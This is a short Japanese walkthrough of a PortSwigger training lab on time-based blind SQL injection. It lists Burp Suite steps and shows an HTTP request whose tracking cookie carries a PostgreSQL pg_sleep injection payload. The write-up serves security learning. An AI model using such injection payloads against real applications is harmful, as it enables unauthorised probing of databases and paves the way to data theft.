# 時間遅延を伴うブラインド SQL インジェクション

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays  
このラボにはブラインド SQL インジェクションの脆弱性が含まれています。アプリケーションは分析に追跡 Cookie を使用し、送信された Cookie の値を含む SQL クエリを実行します。

- 1. BurpSuite を起動して、proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. GET / HTTP/2 リクエストを send to repeater します
- 4. リクエストのクッキーに postgres の sleep 関数を埋め込みます。送信して 10 秒後にレスポンスがあります。

```
GET / HTTP/2
Host: 0a6200a8030e11c681e434aa003400db.web-security-academy.net
Cookie: TrackingId=QwwIjlsFXyK1YIxd'||pg_sleep(10)--; session=6Yg1gqDGB5E6AlHDC3OcMid1AiomCWQ4
```
